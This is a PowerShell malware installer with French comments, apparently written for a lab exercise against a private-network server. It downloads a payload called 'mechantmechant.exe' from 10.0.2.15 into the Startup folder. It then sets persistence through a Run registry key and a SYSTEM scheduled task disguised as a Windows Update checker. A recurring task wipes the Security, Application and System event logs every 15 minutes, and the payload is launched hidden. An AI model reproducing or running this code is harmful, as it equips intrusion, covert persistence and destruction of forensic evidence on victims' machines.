$installPath = "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
$malwareExe = "$installPath\mechantmechant.exe"
$malwareExeRegedit = '"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\mechantmechant.exe" /background'
$logCleanupScriptPath = "$installPath\logs_cleanup.ps1"
$leServeurWeb = "10.0.2.15:80/malware"

Invoke-WebRequest -Uri $leServeurWeb -OutFile %appdata%\Microsoft\Windows\Start Menu\Programs\Startup

# Assurer l'existence de l'exécutable du malware
if (!(Test-Path -Path $malwareExe)) {
    Write-Output "Erreur : Le fichier mechantmechant.exe est introuvable dans $installPath."
    exit
}

# Création du script de nettoyage des logs
@"
wevtutil cl Security
wevtutil cl Application
wevtutil cl System
"@ | Out-File -FilePath $logCleanupScriptPath -Encoding UTF8

# 1. Création du service Windows pour exécuter le malware
#$serviceName = "WindowsUpdateMalware"
#$displayName = "Service Windows Malware"
#$description = "Service de mise à jour automatique du système"

# Supprime le service s'il existe déjà
#sc.exe delete $serviceName | Out-Null
#Start-Sleep -Seconds 2

#ancienne version  mais le service demarrait pas
#sc.exe create $serviceName binPath= $malwareExe DisplayName= $displayName start= auto
#sc.exe description $serviceName $description
#sc.exe start $serviceName
#New-Service -Name $serviceName -BinaryPathName $malwareExe -DisplayName $displayName -Description $description -StartupType Automatic
#Start-Service -Name $serviceName -ErrorAction SilentlyContinue
#if ((Get-Service -Name $serviceName).Status -ne 'Running') {
#    Write-Output "Erreur : Le service $serviceName n'a pas pu démarrer."
#} else {
#    Write-Output "Le service $serviceName a démarré avec succès."
#}

# 2. Ajout d'une entrée dans le registre pour exécuter le malware au démarrage
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$valueName = "WindowsUpdateMalwareValueName"
Set-ItemProperty -Path $registryPath -Name $valueName -Value $malwareExeRegedit

# 3. Création d'une tâche planifiée pour redondance de l'exécution du malware
$taskName = "WindowsUpdateCheckerMalware"
$action = New-ScheduledTaskAction -Execute $malwareExe
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest

# Supprime la tâche planifiée si elle existe déjà
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}
Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName $taskName -Description "Vérification de mise à jour du système"

# 4. Création d'une tâche de nettoyage récurrent des logs
$cleanupTaskName = "LogCleanupTaskMalware"
$cleanupAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File `"$logCleanupScriptPath`""
$cleanupTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(15) -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration (New-TimeSpan -Days 365)

# Supprime la tâche de nettoyage si elle existe déjà
if (Get-ScheduledTask -TaskName $cleanupTaskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $cleanupTaskName -Confirm:$false
}
Register-ScheduledTask -Action $cleanupAction -Trigger $cleanupTrigger -Principal $principal -TaskName $cleanupTaskName -Description "Nettoyage récurrent des logs système"

# 5. Masquage des fichiers et dossiers
#Get-Item $installPath | ForEach-Object { $_.Attributes = 'Hidden' }
#Get-Item $malwareExe | ForEach-Object { $_.Attributes = 'Hidden, System' }
#Get-Item $logCleanupScriptPath | ForEach-Object { $_.Attributes = 'Hidden, System' }

# 6. Exécution initiale du malware et du nettoyage des logs
Start-Process -FilePath $malwareExe -WindowStyle Hidden
Start-Process -FilePath "powershell.exe" -ArgumentList "-File `"$logCleanupScriptPath`"" -WindowStyle Hidden

Write-Output "Installation et configuration terminées avec succès."